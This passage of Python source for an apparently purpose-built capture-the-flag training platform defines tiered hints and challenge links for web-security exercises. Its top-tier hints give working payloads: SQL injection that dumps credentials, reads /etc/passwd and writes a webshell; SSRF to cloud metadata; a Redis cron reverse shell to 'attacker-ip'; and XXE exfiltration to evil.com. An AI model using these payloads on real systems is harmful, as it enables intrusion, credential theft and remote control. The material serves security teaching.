             "Sequential identifiers are predictable. An attacker can enumerate past and future resources.",
             "Create a new account and note your user ID. The next person to register gets ID = yours + 1."),
            ("The age verification popup runs in JavaScript. There's no server-side check.",
             "Client-side validation is a UX feature, not a security control. It can be bypassed entirely.",
             "Disable JavaScript, modify the request, or accept the age check and observe — the server never re-validates."),
            ("You submit a purchase request. It goes into the approval queue. Now check who can approve it...",
             "The approval endpoint doesn't verify that the approver is different from the requester.",
             "Submit a request, then navigate to the approval page. You may be able to approve your own request."),
            ("The 'Check Email Availability' endpoint responds instantly. And has no rate limit.",
             "Without rate limiting, you can check thousands of email addresses per minute.",
             "Script rapid requests to /check-email with a wordlist. Each response reveals whether the email exists."),
            ("File upload validation happens in JavaScript: if(!['jpg','png'].includes(ext)) { alert('Invalid'); return; }",
             "Client-side validation prevents nothing. The server receives whatever the client sends.",
             "Bypass the JS check by modifying the request after it passes validation, or disable JS entirely."),
        ],
        'CH14': [
            ("A REST API endpoint /api/users returns a list of all users. No authentication header is required.",
             "unauthenticated API endpoints are the lowest-hanging fruit. They give away data to anyone who asks.",
             "Use curl or browser to access /api/users without any token or cookie. It returns all user data."),
            ("The file /static/js/app.js is loaded by every page. It contains configuration for API calls.",
             "Client-side API calls need authentication tokens. Sometimes those tokens are hardcoded in the JavaScript.",
             "Search app.js for 'api_key', 'token', 'authorization', or 'bearer'. Hardcoded keys are a common mistake."),
            ("The API accepts JSON request bodies. The user schema has more fields than the documentation shows.",
             "Mass assignment: sending extra fields like 'role' or 'is_admin' that the API accepts but doesn't document.",
             "Send a PATCH /api/users/me with body: {'role': 'admin'}. If the API blindly assigns all fields, you're admin."),
            ("GET /api/users/1 returns: {username, email, phone, ssn, salary, password_hash, ...}",
             "Excessive data exposure: the API returns raw database rows instead of selected safe fields.",
             "Request any user's API profile. Examine every field in the response — password hashes and PII may be included."),
            ("The API resource path is /api/users/3. Your user is ID 3. What about /api/users/1?",
             "API IDOR works identically to web IDOR. Change the ID in the URL to access other users' data.",
             "Loop through /api/users/1, /api/users/2, /api/users/3... each returns a different user's full record."),
            ("A PATCH /api/users/3 request updates your own profile. The endpoint doesn't verify ownership of other IDs.",
             "If the API checks authentication but not authorization, any logged-in user can modify any resource.",
             "PATCH /api/users/1 with your token. If it succeeds, you've modified the admin user's record."),
            ("API changelog: 'v2 — added rate limiting, input validation. v1 — deprecated but still running.'",
             "Deprecated API versions accumulate technical debt and security vulnerabilities.",
             "Access /api/v1/users or /api/v1/admin. Version 1 may lack all the security features added in v2."),
            ("A GraphQL endpoint exists. The introspection query __schema is enabled by default.",
             "GraphQL introspection reveals every type, field, query, and mutation. It's a complete API map.",
             "Send: {__schema{queryType{name}types{name,fields{name}}}} to the GraphQL endpoint."),
            ("Rate limiting returns 429 after 10 requests. Adding X-Forwarded-For: 1.2.3.4 resets the counter.",
             "IP-based rate limiting trusts proxy headers. These headers are trivially spoofable.",
             "Add X-Forwarded-For: [random-ip] to each request. The rate limiter treats each as a different client."),
            ("The API accepts JSON body: {'username': 'bob', 'role': 'user'}. What if you add more fields?",
             "JSON injection means adding unexpected fields that the API processes without validation.",
             "Add 'is_admin': true, 'permissions': ['all'] to the JSON body. The API might accept these extra fields."),
        ],
        'CH15': [
            ("Response header: Access-Control-Allow-Origin: * — every website on the internet is trusted.",
             "Wildcard CORS means any site can make read requests to this API and see the responses.",
             "From any external domain: fetch('http://target/api/data').then(r=>r.json()).then(d=>console.log(d))"),
            ("The server echoes back whatever Origin header you send. Send Origin: evil.com, get ACAO: evil.com.",
             "Origin reflection means the server trusts every origin dynamically. It's equivalent to a wildcard.",
             "Test: curl -H 'Origin: https://evil.com' -I http://target/api/ — if it reflects your origin, it's vulnerable."),
            ("Access-Control-Allow-Origin: null is in the response. The 'null' origin has special significance.",
             "Sandboxed iframes, data: URIs, and some redirect scenarios send 'null' as the Origin.",
             "Create a sandboxed iframe: <iframe sandbox='allow-scripts' srcdoc='<script>fetch(target)...</script>'>. Origin is null."),
            ("ACAO: * + ACAC: true. Credentials (cookies) are sent to any requesting origin. This is catastrophic.",
             "Wildcard + credentials means any site can authenticate as the user and read their private data.",
             "Make authenticated cross-origin requests with credentials:'include'. Cookies are sent; data is readable."),
            ("The CORS policy trusts *.pentrix.corp. Any subdomain is allowed to make cross-origin requests.",
             "If you can find XSS on any subdomain, you can use it to make CORS-authenticated requests.",
             "Find XSS on sub.pentrix.corp, then use it to fetch('http://pentrix.corp/api/secret', {credentials:'include'})."),
            ("CORS allows the response to be read. The endpoint doesn't have CSRF protection.",
             "Reading + Writing = complete exploitation. Steal the data, force actions, all cross-origin.",
             "fetch() with credentials:'include' + no CSRF = read sensitive data from cross-origin."),
            ("GET and HTML-content-type POST are 'simple requests'. They skip the OPTIONS pre-flight check.",
             "This means these requests reach the server directly, without a pre-flight that could reject them.",
             "Use a simple POST with Content-Type: text/plain (or let form encoding default) to bypass pre-flight."),
            ("An internal API at /api/internal/ has CORS enabled for all origins. It returns system configuration.",
             "Internal APIs with permissive CORS expose internal data to any external website.",
             "Access /api/internal/ endpoints from an external origin. CORS headers allow the cross-origin read."),
            ("CORS whitelist checks if origin.endsWith('pentrix.corp'). Test: evil-pentrix.corp.",
             "Suffix-based origin validation is bypassable. Register a domain that ends with the trusted substring.",
             "Set Origin: https://evil-pentrix.corp. If it passes the check, the validation is flawed."),
            ("GET /api/private/export returns sensitive data. CORS allows any origin to read it.",
             "Data export endpoints are high-value targets. CORS misconfiguration on these is critical.",
             "From an external site, fetch('/api/private/export') with credentials. The response data is readable."),
        ],
        'CH16': [
            ("The login form query: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. Your input completes the query.",
             "SQL injection in login forms bypasses authentication by manipulating the WHERE clause logic.",
             "Try username: admin' -- (comment out password check) or: ' OR '1'='1 (always-true condition)."),
            ("UNION SELECT combines your query with the original. First, match the column count.",
             "Use ORDER BY to determine column count. Then UNION SELECT to query the database schema.",
             "Try: ' UNION SELECT 1,2,3-- incrementing numbers until no error. Then: ' UNION SELECT name,type,sql FROM sqlite_master--"),
            ("You know the table name 'users'. Now extract every row from it using UNION SELECT.",
             "The users table likely has columns: id, username, password, email, role. Map them to the UNION positions.",
             "Try: ' UNION SELECT username, password, email FROM users-- to dump all credentials."),
            ("When your SQL causes an error, the error message includes details about the query structure.",
             "Error-based SQLi extracts data through the error message itself, one piece at a time.",
             "Force an error: ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- The error message includes the username."),
            ("The search function returns different numbers of results based on your input. Use this as a signal.",
             "Boolean-based blind SQLi: inject conditions that are true or false, and observe the difference in output.",
             "Compare: a' AND 1=1-- (returns results) vs a' AND 1=2-- (returns nothing). The difference confirms injection."),
            ("There's no visible difference in output. But you can make the database take measurably longer to respond.",
             "Time-based blind SQLi uses delays to exfiltrate data. Each delay confirms or denies your hypothesis.",
             "Try: ' AND CASE WHEN (substr(username,1,1)='a') THEN randomblob(90000000) ELSE 1 END-- Measure response time."),
            ("Register with username: admin'-- . Later, when a query uses your username, the injected SQL executes.",
             "Second-order SQLi: the malicious input is stored safely, but the next query that uses it is vulnerable.",
             "Register with an SQLi payload as your username. When the app uses that username in another query, the injection fires."),
            ("The URL has ?sort=name. The server builds: ORDER BY name. This parameter isn't parameterized.",
             "ORDER BY injection: column names can't be parameterized in most frameworks.",
             "Try: ?sort=name; SELECT CASE WHEN (1=1) THEN name ELSE email END. Or use error-based techniques in ORDER BY."),
            ("SQLite includes functions for file I/O if compiled with extensions. Can you read system files?",
             "readfile() and writefile() are SQLite extension functions that interact with the filesystem.",
             "Inject: ' UNION SELECT readfile('/etc/passwd'),null,null-- to read system files through SQLite."),
            ("SQLite's writefile() can create files on the server. Write to a location the web server serves.",
             "A webshell is a tiny script that executes commands. Write one to the static files directory.",
             "' UNION SELECT writefile('/app/static/shell.py','import os;os.system(\"id\")'),null,null--"),
        ],
        'BONUS-SSRF': [
            ("A 'Website Preview' feature fetches URLs and displays the response. It runs on the server.",
             "The server fetches whatever URL you provide. If it's inside the firewall, it can reach internal services.",
             "Enter: http://localhost:8080 or http://internal:8080. The server fetches the internal service."),
            ("Cloud platforms expose instance metadata at well-known addresses. They're only accessible from inside the network.",
             "AWS: 169.254.169.254, GCP: metadata.google.internal. These endpoints return credentials and configuration.",
             "Fetch: http://169.254.169.254/latest/meta-data/ through the SSRF vector. Cloud credentials may be returned."),
            ("An 'Import URL' feature downloads and processes remote content. The download happens server-side.",
             "Any server-side URL fetch is an SSRF vector. Redirects can bypass URL validation.",
             "Submit your server URL. Set it to redirect to http://localhost:8080. The redirect bypasses the URL filter."),
            ("A webhook verification feature makes an HTTP request to your specified URL. The response isn't returned.",
             "Blind SSRF: the server makes the request but you can't see the response. Use DNS or HTTP logging to confirm.",
             "Point the webhook to your server (or Burp Collaborator). Check logs to confirm the server-side request."),
            ("The SSRF filter blocks '127.0.0.1' and 'localhost'. But the loopback has many representations.",
             "Alternative loopback representations: 0x7f000001, 2130706433, 017700000001, 0.0.0.0, ::1, 0177.0.0.1.",
             "Try: http://0x7f000001:8080 or http://2130706433:8080 or http://[::1]:8080. Numerical encoding bypasses filters."),
            ("The URL fetcher normally uses HTTP. But what protocol does it support besides HTTP?",
             "The file:// protocol reads local files. If the URL parser supports it, you can read the filesystem.",
             "Try: file:///etc/passwd or file:///app/config.json. The server reads local files through the file protocol."),
            ("Redis runs on port 6379 with no authentication. It accepts commands over raw TCP.",
             "SSRF to Redis: craft a URL that sends Redis commands when Redis interprets the HTTP request as commands.",
             "Send: http://internal:6379/ with a payload structured as Redis commands. Use gopher:// for precise control."),
            ("DNS rebinding: your domain resolves to your server first, then to 127.0.0.1 on the second resolution.",
             "Set up a DNS server that alternates between external and internal IPs. The app validates the first, fetches the second.",
             "Use a rebinding service. The filter checks your external IP, but the actual request resolves to localhost."),
            ("An admin panel runs on port 8080, accessible only from inside the network.",
             "Use SSRF to access the internal admin panel. It may not require authentication for internal connections.",
             "Fetch: http://localhost:8080/admin or http://internal:8080/admin through the SSRF endpoint."),
            ("SSRF → Redis → Write crontab → RCE. Each step chains into the next.",
             "Write a cron job entry through Redis that executes a reverse shell command at the next minute.",
             "Via SSRF to Redis: SET cron '* * * * * /bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1' — then CONFIG SET dir /var/spool/cron/"),
        ],
        'BONUS-XXE': [
            ("An XML upload feature processes well-formed XML documents. It supports Document Type Definitions.",
             "XML external entities are defined in the DTD and reference external resources like files or URLs.",
             "Submit: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"),
            ("SVG upload is supported. SVG files are XML documents that support the same DTD features.",
             "Create an SVG file with an external entity declaration in its DTD section.",
             "Upload: <svg xmlns='...'><defs><!ENTITY xxe SYSTEM 'file:///etc/passwd'></defs><text>&xxe;</text></svg>"),
            ("The application imports XLSX spreadsheet files. XLSX is actually a ZIP of XML files.",
             "Unzip the XLSX, inject XXE into the XML files inside, re-zip, and upload.",
             "Add <!DOCTYPE ... [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> to the XML content files inside the XLSX."),
            ("The server processes your XML but doesn't display entity values. Data must travel a different path.",
             "Out-of-band XXE: make the server send the data to your controlled server via HTTP or DNS.",
             "Define an external DTD on your server that reads a file and sends its content as a URL parameter to your server."),
            ("External entities make HTTP requests. This is effectively SSRF through XML.",
             "Define an entity pointing to an internal URL. The XML parser fetches it during document processing.",
             "<!ENTITY xxe SYSTEM 'http://internal:8080/admin'> — the parser fetches the internal admin page."),
            ("Parameter entities (used with %) work in the DTD context and have different parsing rules.",
             "Parameter entities can reference external DTDs, which then define general entities with file contents.",
             "Use: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://evil.com/?data=%file;\">'>"),
            ("If you cause a parsing error, the error message might include the entity value.",
             "Error-based exfiltration: define an entity from a file, then use it in a way that causes a parser error.",
             "Reference a non-existent resource that includes the file content: the error message reveals the data."),
            ("A SOAP web service accepts XML request bodies. Standard SOAP processing includes entity resolution.",
             "SOAP requests are XML. Insert an external entity declaration in the SOAP body.",
             "Inject the XXE DTD before the SOAP Body element. The entity will be resolved during SOAP processing."),
            ("XInclude provides an alternative to DTD-based XXE. It doesn't require modifying the document type.",
             "XInclude uses a namespace and 'include' element. It works even when you can't control the DTD.",
             "Inject: <xi:include xmlns:xi='http://www.w3.org/2001/XInclude' parse='text' href='file:///etc/passwd'/>"),
            ("The Billion Laughs attack: each entity references the previous one ten times. Exponential expansion.",
             "Entity a1 = 'lol'. Entity a2 = '&a1;&a1;&a1;...'. By a9, the expansion is billions of characters.",
             "Define 9 levels of entity expansion, each 10x the previous. The parser runs out of memory processing them."),
        ],
    }

    for chapter, hints_list in hint_templates.items():
        for i, (h1, h2, h3) in enumerate(hints_list, 1):
            flag_id = f"{chapter}-C{i:02d}"
            HINTS[flag_id] = [
                {'tier': 1, 'content': h1, 'points_cost': 50},
                {'tier': 2, 'content': h2, 'points_cost': 50},
                {'tier': 3, 'content': h3, 'points_cost': 50},
            ]


_build_hints()


# ══════════════════════════════════════════════════════════════════
# MULTI-CHALLENGE LINKAGE — Exploration graph, not linear checklist
# Each entry maps a flag_id → list of related challenges with context
# ══════════════════════════════════════════════════════════════════
CHALLENGE_LINKS = {
    'CH01-C02': {
        'leads_to': ['CH01-C09', 'CH07-C01', 'CH07-C04'],
        'context': 'robots.txt reveals hidden paths — follow each Disallow entry to discover secret endpoints.'
    },
    'CH01-C04': {
        'leads_to': ['CH04-C02', 'CH04-C04', 'CH04-C08'],
        'context': 'The backup file contains credentials and config paths that unlock further info disclosure challenges.'
    },
    'CH01-C09': {
        'leads_to': ['CH04-C06', 'CH07-C09'],
        'context': 'The changelog mentions migration artifacts and test endpoints still active — explore them.'
    },
    'CH01-C10': {
        'leads_to': ['CH04-C02', 'CH04-C04', 'CH14-C01'],
        'context': 'The debug endpoint leaks the SECRET_KEY — this unlocks JWT forgery and session manipulation.'
    },
    'CH02-C01': {
        'leads_to': ['CH02-C04', 'CH02-C07'],
        'context': 'Server headers reveal the full technology stack. Each header is a separate fingerprinting vector.'
    },
    'CH03-C01': {
        'leads_to': ['CH03-C02', 'CH03-C03', 'CH04-C05'],
        'context': 'Accessing other profiles via IDOR reveals sensitive data fields — SSN, salary, credit cards.'
    },
    'CH04-C02': {
        'leads_to': ['CH14-C01', 'CH14-C02'],
        'context': 'The leaked SECRET_KEY from debug/backup enables JWT forgery and session cookie manipulation.'
    },
    'CH06-C01': {
        'leads_to': ['CH06-C03', 'CH06-C05', 'CH11-C01'],
        'context': 'Basic SQLi reveals the database structure. UNION queries expose other tables. Blind SQLi extracts hidden data.'
    },
    'CH07-C01': {
        'leads_to': ['CH07-C04', 'CH07-C07'],
        'context': 'The secret terminal reveals environment variables and links to other hidden admin endpoints.'
    },
    'CH08-C01': {
        'leads_to': ['CH08-C02', 'CH09-C01', 'CH16-C01'],
        'context': 'Command injection on the ping tool enables arbitrary command execution — escalate to SSRF or read config files.'
    },
    'CH09-C01': {
        'leads_to': ['CH09-C02', 'CH09-C05'],
        'context': 'The SSRF via fetch tool reaches the internal service. Each internal endpoint contains different data.'
    },
    'CH10-C01': {
        'leads_to': ['CH10-C02', 'CH10-C03', 'CH10-C05'],
        'context': 'CSRF on email change works because NO forms have CSRF tokens. The same technique applies to password change, account deletion, and role promotion.'
    },
    'CH13-C02': {
        'leads_to': ['CH13-C01', 'CH13-C04'],
        'context': 'Logic flaws compound — negative transfers, race conditions, and skippable verification reveal systemic design weaknesses.'
    },
    'CH14-C01': {
        'leads_to': ['CH14-C02', 'CH03-C01'],
        'context': 'Forged JWT tokens can impersonate any user. Combined with IDOR knowledge, you can access admin-only endpoints.'
    },
    'CH16-C01': {
        'leads_to': ['CH16-C05', 'CH16-C07'],
        'context': 'Pickle deserialization enables RCE. YAML deserialization does the same. Both are found through the tools interface.'
    },
}
